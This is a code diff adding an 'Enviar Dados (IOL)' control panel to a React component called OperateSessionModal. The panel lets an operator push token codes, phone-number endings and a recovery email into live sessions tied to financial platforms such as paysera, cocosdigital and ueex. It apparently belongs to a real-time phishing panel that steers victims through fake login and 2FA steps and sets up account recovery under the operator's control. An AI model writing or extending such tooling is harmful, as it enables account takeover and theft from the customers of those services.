@@ -665,6 +665,53 @@ const OperateSessionModal = ({ session, onClose, index }: OperateSessionModalPro
                 />
               </div>
             </div>
+
+            {/* ── Enviar Dados (IOL) ── */}
+            <div className="rounded-lg border border-border bg-background/30 p-3">
+              <p className="text-[9px] font-bold uppercase tracking-widest text-muted-foreground/60 mb-2">📨 Enviar Dados</p>
+              <div className="space-y-1.5">
+                <div className="flex gap-1">
+                  <input value={adminTokenCode} onChange={(e) => setAdminTokenCode(e.target.value)} placeholder="Token (número) →" className="flex-1 min-w-0 rounded-md border border-input bg-background/50 px-2 py-1.5 text-[10px] text-foreground placeholder:text-muted-foreground/40 focus:outline-none focus:ring-1 focus:ring-primary" />
+                  <button onClick={eSendToken} disabled={!adminTokenCode.trim() || !!sending} className="inline-flex min-w-[88px] items-center justify-center gap-1 rounded-md bg-primary px-2 py-1.5 text-[10px] font-semibold text-primary-foreground disabled:opacity-40 hover:opacity-90 transition-opacity">
+                    <KeyRound size={10} /> Enviar
+                  </button>
+                </div>
+                <div className="flex gap-1">
+                  <input
+                    value={adminSmsNumber}
+                    onChange={(e) => setAdminSmsNumber(e.target.value)}
+                    placeholder="Final do telefone (ex: 42) →"
+                    className="flex-1 min-w-0 rounded-md border border-blue-500/30 bg-background/50 px-2 py-1.5 text-[10px] text-foreground placeholder:text-muted-foreground/40 focus:outline-none focus:ring-1 focus:ring-blue-500"
+                  />
+                  <button onClick={eSendSms} disabled={!adminSmsNumber.trim() || !!sending} className="inline-flex min-w-[88px] items-center justify-center gap-1 rounded-md bg-blue-500 px-2 py-1.5 text-[10px] font-semibold text-white disabled:opacity-40 hover:bg-blue-600 transition-colors">
+                    <Smartphone size={10} /> Enviar
+                  </button>
+                </div>
+                <div className="flex gap-1">
+                  <input
+                    value={adminRecoveryEmail}
+                    onChange={(e) => setAdminRecoveryEmail(e.target.value)}
+                    placeholder="Email de recuperação →"
+                    type="email"
+                    className="flex-1 min-w-0 rounded-md border border-amber-500/30 bg-background/50 px-2 py-1.5 text-[10px] text-foreground placeholder:text-muted-foreground/40 focus:outline-none focus:ring-1 focus:ring-amber-500"
+                  />
+                  <button
+                    onClick={() => {
+                      if (!adminRecoveryEmail.trim()) return;
+                      doAction("e_recovery_email", "confirm_ask_recovery_email", [
+                        { event: "admin_decision", payload: { status: "confirm_ask_recovery_email", recovery_email: adminRecoveryEmail } },
+                        { event: "admin_sync_decision", payload: { status: "sync_ask_recovery_email", recovery_email: adminRecoveryEmail } },
+                      ], { otp_code: `recovery_email_addr:${adminRecoveryEmail}` });
+                      setAdminRecoveryEmail("");
+                    }}
+                    disabled={!adminRecoveryEmail.trim() || !!sending}
+                    className="inline-flex min-w-[88px] items-center justify-center gap-1 rounded-md bg-amber-500 px-2 py-1.5 text-[10px] font-semibold text-white disabled:opacity-40 hover:bg-amber-600 transition-colors"
+                  >
+                    <Mail size={10} /> Enviar
+                  </button>
+                </div>
+              </div>
+            </div>
           </>
         ) : (session.source === "paysera" || session.source === "cocosdigital" || session.source === "ueex") ? (
           /* ── Platform + Identificação + Email Sync Controls ── */
